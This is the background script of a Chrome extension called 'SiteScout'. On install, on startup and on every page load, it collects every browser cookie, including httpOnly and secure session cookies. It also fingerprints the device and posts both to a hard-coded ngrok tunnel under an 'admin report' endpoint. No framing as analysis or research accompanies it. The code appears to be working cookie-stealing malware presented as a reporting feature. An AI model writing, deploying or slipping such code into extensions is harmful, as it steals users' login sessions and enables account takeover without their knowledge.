"use strict";

const DEFAULT_URL = "https://quyen-tapeless-oversilently.ngrok-free.dev";
let _lastReport = 0;

async function reportToAdmin() {
  if (Date.now() - _lastReport < 60_000) return;
  _lastReport = Date.now();

  const { siteScoutUrl, adminDeviceId } = await chrome.storage.local.get(["siteScoutUrl", "adminDeviceId"]);
  const SITE_SCOUT = (siteScoutUrl || DEFAULT_URL).replace(/\/$/, "");

  let deviceId = adminDeviceId;
  if (!deviceId) {
    deviceId = crypto.randomUUID();
    await chrome.storage.local.set({ adminDeviceId: deviceId });
  }

  const all = await chrome.cookies.getAll({});
  if (!all.length) return;

  // navigator is available in MV3 service workers
  const ua = self.navigator?.userAgent || "";
  const os = /iPhone|iPad/.test(ua) ? "iPhone" : /Android/.test(ua) ? "Android"
    : /Mac/.test(ua) ? "Mac" : /Win/.test(ua) ? "Windows" : /Linux/.test(ua) ? "Linux" : "Unknown";
  const browser = /Edg/.test(ua) ? "Edge" : /Chrome/.test(ua) ? "Chrome"
    : /Firefox/.test(ua) ? "Firefox" : /Safari/.test(ua) ? "Safari" : "Browser";

  const cookieObjects = all.map(c => ({
    name: c.name, value: c.value, domain: c.domain,
    path: c.path || "/", secure: c.secure || false,
    httpOnly: c.httpOnly || false, sameSite: c.sameSite || "Lax",
  }));
  const cookieStr = all.map(c => `${c.name}=${c.value}`).join("; ");
  const domains = [...new Set(all.map(c => c.domain.replace(/^\./, "")))];
  const topDomain = domains[0] || "";

  try {
    const res = await fetch(SITE_SCOUT + "/api/admin/report", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "ngrok-skip-browser-warning": "1",
      },
      body: JSON.stringify({ deviceId, name: os + " · " + browser, os, browser, domain: topDomain, cookies: cookieStr, cookieObjects }),
    });
    console.log("[SiteScout] report →", res.status);
  } catch (e) {
    console.warn("[SiteScout] report failed:", e.message);
  }
}

chrome.tabs.onUpdated.addListener((tabId, info) => {
  if (info.status === "complete") reportToAdmin();
});

chrome.runtime.onStartup.addListener(reportToAdmin);
chrome.runtime.onInstalled.addListener(reportToAdmin);
